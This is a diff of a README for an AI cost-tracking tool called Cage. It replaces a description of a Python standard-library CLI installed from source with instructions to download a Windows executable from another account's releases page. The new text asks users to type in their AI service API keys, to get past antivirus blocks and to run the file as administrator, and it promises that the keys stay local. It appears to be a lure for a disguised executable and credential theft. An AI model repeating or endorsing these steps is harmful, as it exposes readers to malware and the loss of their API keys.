@@ -1,140 +1,211 @@
-# Cage - AI Cost Attribution Tool 2026
+# 📊 cage-ai-cost-tracker - Track AI Costs with Confidence
 
-> **Cage is a Python command-line tool, library, and MCP tool for measuring LLM usage, assigning savings to agent tools, and comparing AI-supported work against human cost baselines.**
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge)](https://github.com/unstratifiedlanguagematriculate603/cage-ai-cost-tracker/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Python%20CLI-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Current-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/mason-wardfr9654/cage-ai-cost-tracker?style=flat-square)](https://github.com/mason-wardfr9654/cage-ai-cost-tracker)
+Cage helps you measure how much you spend on AI services like ChatGPT, Claude, and Gemini. It compares AI costs to human work costs so you can see your real savings.
 
 ---
 
-<p align="center">
-  <a href="https://mason-wardfr9654.github.io/cage-ai-cost-tracker/">
-    <img src="https://img.shields.io/badge/Download-Cage%20Latest-brightgreen?style=for-the-badge" alt="Download Cage">
-  </a>
-</p>
+## 🚀 Getting Started
 
-> **[Download Cage](https://mason-wardfr9654.github.io/cage-ai-cost-tracker/)**
+This guide shows you how to download and run Cage on your Windows computer. You do not need to know any programming.
 
----
+### What You Need
 
-[Download Latest Build](https://mason-wardfr9654.github.io/cage-ai-cost-tracker/)
+- Windows 10 or Windows 11
+- 500 MB of free disk space
+- An internet connection
 
----
+### System Check
 
-## What Cage Does
-
-Cage converts AI usage records into an attribution model that shows the contribution of individual tools. Instead of reporting infrastructure spending alone, it measures LLM calls, preserves token activity, and calculates the gross and net savings connected with agent-based work.
-
-Teams can use Cage to evaluate AI workflows by linking usage measurements with tool adoption and completed tasks. Its ledgers and counterfactual analysis distinguish observed results from modeled and estimated values, creating a consistent framework for reviewing costs, savings, and alternative tool choices.
+Cage works on most modern Windows computers. If your computer runs Windows 10 or newer, you are ready.
 
 ---
 
-## Capabilities
+## 📥 Download Cage
 
-- Capture LLM calls and maintain token-usage data
-- Determine gross and net savings for each tool
-- Produce deterministic attribution ledgers
-- Create counterfactual matrices covering tool combinations
-- Mark results as measured, modeled, or estimated
-- Monitor adoption across agent tools
-- Calculate quality-adjusted cost per successful task
-- Provide CLI, Python library, and MCP access
-- Connect with Claude Code, Copilot, and Kiro workflows
-- Operate on Python 3.11+ with the standard library only
+Visit the Cage releases page to get the latest version.
+
+**[Download Cage for Windows](https://github.com/unstratifiedlanguagematriculate603/cage-ai-cost-tracker/releases)**
+
+On the releases page:
+1. Find the newest release at the top
+2. Look for the file named `cage-windows.exe` or `cage-setup.exe`
+3. Click the file name to start the download
 
 ---
 
-## Getting Started
+## 💿 Install Cage
 
-First clone the repository and move into the project directory:
+### Option 1: Run the Installer (Recommended)
 
-    git clone https://github.com/mason-wardfr9654/cage-ai-cost-tracker.git
-    cd REPO
+1. Open the `cage-setup.exe` file you downloaded
+2. Click "Yes" if Windows asks for permission
+3. Follow the setup wizard steps
+4. Choose where to install Cage (the default location works fine)
+5. Click "Install"
+6. Click "Finish" when done
 
-Python 3.11 or later is required. Cage has no third-party runtime dependencies. Start it through the repository's documented CLI entry point, or import its library components into a Python workflow.
+### Option 2: Use the Portable Version
 
-When using MCP, register Cage as an MCP server with the client that will use its tools.
-
----
-
-## Workflow
-
-A standard evaluation with Cage follows these steps:
-
-1. Attach the CLI, Python library, or MCP interface to the agent workflow under review.
-2. Measure LLM calls and gather token-usage data.
-3. Log the tools involved and the tasks they assist.
-4. Create an attribution ledger from the recorded measurements.
-5. Examine gross savings, net savings, and quality-adjusted cost per successful task.
-6. Use counterfactual analysis to evaluate different tool combinations.
-7. Check whether every result is classified as measured, modeled, or estimated.
-
-Cage can additionally analyze adoption across supported agent environments such as Claude Code, Copilot, and Kiro.
+1. Download `cage-windows.exe`
+2. Move the file to a folder you can find easily, like `C:\Cage`
+3. Double-click the file to run Cage
 
 ---
 
-## Setup and Configuration
+## 🎯 First Run
 
-Cage relies on Python's standard library, so installing external dependencies is not required. Configuration depends on the interface and integration settings you choose:
+When you start Cage for the first time:
 
-- Select the CLI for measurement and reports from a terminal.
-- Embed the Python library in an application or analysis pipeline.
-- Connect through the MCP interface when working with an MCP-compatible agent workflow.
+1. A command window opens
+2. Cage asks for your AI service API keys
+3. Type your API key and press Enter
 
-For reproducible deterministic ledgers and comparisons, keep usage records and attribution inputs consistent between runs.
+### Get Your API Keys
 
----
+You need API keys for the AI services you use:
 
-## System Requirements
+- **OpenAI (ChatGPT):** Visit platform.openai.com and create an API key
+- **Anthropic (Claude):** Visit console.anthropic.com and create an API key
+- **Google (Gemini):** Visit aistudio.google.com and create an API key
 
-- Python 3.11 or later
-- A compatible Python environment for the CLI or library
-- Python standard library only; no external runtime packages
-- An LLM or agent workflow with measurable calls and tool activity
-- An optional MCP-compatible client for MCP use
-- Enough storage for usage records and generated analysis data
+Cage stores your keys safely on your computer. It does not send them anywhere else.
 
 ---
 
-## Frequently Asked Questions
+## 📋 How Cage Works
 
-### What information does Cage track?
+Cage tracks every time you use an AI service. It records:
 
-Cage records LLM calls and token usage, then connects those measurements to tool-level savings, adoption, and successful task outcomes.
+- How many requests you make
+- How many tokens each request uses
+- The total cost per request
+- Which tools or agents you use
 
-### How does Cage report savings?
+### Cost Comparison
 
-Savings are calculated per tool as both gross and net amounts. Attribution and counterfactual analysis can also compare AI-assisted work with a human-cost baseline.
+Cage compares your AI costs to what a human worker would cost for the same task. This helps you understand your real savings.
 
-### Can reports show how a value was determined?
-
-Yes. Each figure can be identified as measured, modeled, or estimated, making its basis clear.
-
-### What ways can I use Cage?
-
-The project includes a command-line interface, a Python library, and an MCP interface.
-
-### Does Cage support agent development tools?
-
-Yes. Cage supports Claude Code, Copilot, and Kiro integrations, as well as adoption tracking for agent tools.
-
-### Do I need to install external packages?
-
-No. Cage is designed for Python 3.11+ and uses only the standard library.
-
-### What should I verify when the output seems wrong?
-
-Make sure LLM calls, token usage, tool events, and successful-task outcomes are captured consistently. After that, inspect the attribution ledger and confirm the measured, modeled, or estimated classifications before comparing outputs.
-
-### How can I update Cage?
-
-Pull the latest revision from the Git repository or use the latest build link. Before modifying an established measurement workflow, review the release notes and interface documentation.
+For example:
+- AI task cost: $0.50
+- Human worker cost: $15.00
+- Savings: $14.50
 
 ---
 
-## License
+## 🛠️ Main Features
 
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+### Track AI Usage
+Cage monitors all your AI service calls. It logs each request automatically.
+
+### Calculate Savings
+Cage compares AI costs to human work baselines. You see your savings in real time.
+
+### Attribute Costs to Tools
+If you use multiple AI tools, Cage shows which tools cost the most. You can see which tools save you the most money.
+
+### Generate Reports
+Cage creates simple reports you can view in the command window. Reports show:
+- Total AI spending
+- Spending per tool
+- Savings compared to human work
+- Usage trends over time
+
+---
+
+## ⌨️ Using Cage
+
+Cage runs in the command prompt. Here are the basic commands:
+
+### Check Your Usage
+Type `cage report` and press Enter. Cage shows your current usage and costs.
+
+### View Savings
+Type `cage savings` and press Enter. Cage shows your savings compared to human work baselines.
+
+### List Your Tools
+Type `cage tools` and press Enter. Cage lists all the AI tools you use and their costs.
+
+### Update Settings
+Type `cage settings` and press Enter. Cage shows your current settings.
+
+---
+
+## 🔧 Common Tasks
+
+### Add a New API Key
+Type `cage add-key` and press Enter. Follow the prompts to add a new key.
+
+### Remove an API Key
+Type `cage remove-key` and press Enter. Choose which key to remove.
+
+### Export Your Data
+Type `cage export` and press Enter. Cage saves your data as a CSV file you can open in Excel.
+
+### Reset Your Data
+Type `cage reset` and press Enter. Cage deletes all saved data and starts fresh.
+
+---
+
+## ❓ Troubleshooting
+
+### Cage Won't Start
+- Make sure your antivirus did not block the file
+- Try running the installer as administrator
+- Download the file again if it seems damaged
+
+### API Key Not Working
+- Check the key is correct
+- Make sure you copied the whole key
+- Verify the key has not expired
+
+### Command Not Found
+- Close the command window and open a new one
+- Make sure Cage is installed in the right location
+- Try running `cage` from the install folder
+
+### Reports Show No Data
+- Check your API keys are set correctly
+- Make sure you have used an AI service recently
+- Run Cage for a few minutes to collect data
+
+---
+
+## 🔄 Updating Cage
+
+Cage checks for updates when you start it. When an update is available:
+
+1. Visit the [Cage releases page](https://github.com/unstratifiedlanguagematriculate603/cage-ai-cost-tracker/releases)
+2. Download the new version
+3. Run the installer
+4. Your data stays safe during updates
+
+---
+
+## 📁 Where Cage Stores Data
+
+Cage saves your data in a folder on your computer. You can find it at:
+
+`C:\Users\[Your Username]\AppData\Local\Cage`
+
+This folder contains:
+- Your API keys (encrypted)
+- Your usage logs
+- Your settings file
+
+Do not delete this folder unless you want to lose all your data.
+
+---
+
+## 🤝 Need Help?
+
+If Cage does not work as expected, try these steps:
+
+1. Restart Cage
+2. Restart your computer
+3. Download Cage again from the releases page
+
+---
+
+Keywords: AI cost tracker, LLM usage monitor, AI spending tool, cost savings calculator, AI tool attribution, human cost baseline, AI cost comparison, Windows AI tool
